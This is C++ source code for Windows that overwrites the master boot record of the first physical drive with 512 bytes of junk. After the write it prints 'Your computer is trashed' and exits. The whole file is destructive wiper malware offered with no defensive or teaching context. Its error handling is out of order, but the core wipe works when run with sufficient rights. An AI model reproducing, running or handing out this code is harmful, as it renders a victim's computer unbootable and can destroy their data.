#include <windows.h>
#include <stdio.h>
#include <iostream>

#define MBR_DATA 512

using namespace std;


void wipeMbr() {
    DWORD dwBytesReturned;
    char mbrData[MBR_DATA];
    HANDLE masterBootRecord = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
                                         FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                                         OPEN_EXISTING, NULL, NULL);

    if (WriteFile(masterBootRecord, mbrData, MBR_DATA,
                  &dwBytesReturned, NULL) == TRUE) {
        cout << "MBR is wiped. Your computer is trashed" << endl;
        Sleep(5000);
        ExitProcess(0);
    } else {
        cout << "MBR is not wiped. Your computer is not trashed :(" << endl;
    }

    if (masterBootRecord == INVALID_HANDLE_VALUE) {
        printf("Error: CreateFile failed\n");
        return;
    }
    if (!DeviceIoControl(masterBootRecord, 0x0007c088, NULL, 0, mbrData, 512, &dwBytesReturned, NULL)) {
        printf("Error: DeviceIoControl failed\n");
        return;
    }
    CloseHandle(masterBootRecord);

}

int main() {
    wipeMbr();
    return 0;
}